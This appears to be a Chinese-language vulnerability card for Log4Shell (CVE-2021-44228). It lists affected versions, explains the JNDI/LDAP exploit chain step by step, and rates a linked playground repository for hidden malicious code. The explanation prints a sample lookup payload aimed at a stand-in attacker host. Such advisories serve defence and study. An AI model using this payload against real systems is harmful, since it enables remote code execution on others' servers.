## CVE-2021-44228-Apache Log4j2-JNDI注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** JNDI注入

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 <= version <= 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用受影响的Log4j2版本，且启用了message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228，又名Log4Shell，是Apache Log4j2中的一个严重漏洞。该漏洞源于Log4j2的JNDI功能未对攻击者控制的LDAP和其他JNDI相关端点提供保护。攻击者可以通过控制日志消息或日志消息参数，利用message lookup substitution功能从LDAP服务器加载并执行任意代码，从而实现远程代码执行(RCE)。

**漏洞利用方式：**

1.  **构造恶意请求：** 攻击者构造包含JNDI查找表达式的恶意请求，例如`${jndi:ldap://attacker.com/evil}`。该表达式会被记录到日志中。
2.  **JNDI查找：** Log4j2解析日志消息时，会识别并执行JNDI查找表达式。
3.  **LDAP请求：** Log4j2向攻击者控制的LDAP服务器(attacker.com)发起LDAP请求。
4.  **恶意代码加载：** LDAP服务器响应一个包含恶意Java类的URL。
5.  **远程代码执行：** Log4j2从URL加载并执行恶意Java类，导致RCE。

**有效性：**
根据漏洞库信息和搜索引擎结果，该漏洞利用的POC代码是有效的。搜索引擎结果中多个条目（如CISA，Palo Alto Networks，Sysdig，Cloudflare, NVD等）都确认了该漏洞的存在以及公开的POC代码的存在。漏洞库信息也明确指出该漏洞可以被利用来执行任意代码。

**投毒风险：**
提供的漏洞利用代码只包含GNU GPL协议文本，是一个许可协议，不包含任何可执行的代码。因此，判断此仓库中不存在作者隐藏的投毒代码，风险为0%。 该协议只声明了软件的使用许可，无法直接用于漏洞利用或者进行恶意攻击，与Log4Shell漏洞本身没有直接关系。


**项目地址:** [b-abderrahmane/CVE-2021-44228-playground](https://github.com/b-abderrahmane/CVE-2021-44228-playground)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)